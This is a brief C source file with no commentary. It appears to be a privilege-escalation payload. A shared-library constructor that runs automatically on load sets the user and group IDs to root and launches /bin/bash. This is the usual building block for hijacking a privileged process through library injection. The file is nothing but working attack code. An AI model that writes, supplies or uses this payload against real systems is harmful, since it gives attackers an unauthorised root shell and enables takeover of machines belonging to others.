#include <unistd.h>
#include <stdlib.h>
#include <string.h>
static void __attribute__ ((constructor)) _init(void);
static void _init(void) {
	char *initargv[] = { "bash", NULL };
	char *initenvp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
	setuid(0); seteuid(0); setgid(0); setegid(0);
	execve("/bin/bash", initargv,initenvp);
}
